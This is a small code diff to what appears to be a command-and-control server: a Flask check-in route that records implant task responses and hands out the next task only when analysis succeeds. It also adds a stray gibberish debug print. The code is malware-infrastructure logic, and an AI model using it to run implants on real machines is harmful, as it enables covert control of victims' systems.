@@ -49,11 +49,11 @@ def checkin():
     print(f'[+] --> TaskResponse = [{ic.Resp}]')
 
     update_implant_last_seen(ic.ImplantID) 
-    
-    analyze_TaskResponse(ic.Resp)
-
-    # Send TaskRequest back or "" (if no tasks)
-    return get_next_task(ic.ImplantID)
+    print('ksaf;kjaskldfjlaskdjfl')
+    # Send TaskRequest back or "" (if failed to analyze or no remaining tasks)
+    if analyze_TaskResponse(ic.Resp):
+        return get_next_task(ic.ImplantID)
+    return ""
 
 @rpc.route("/task/request", methods=["POST"])
 def send_task():
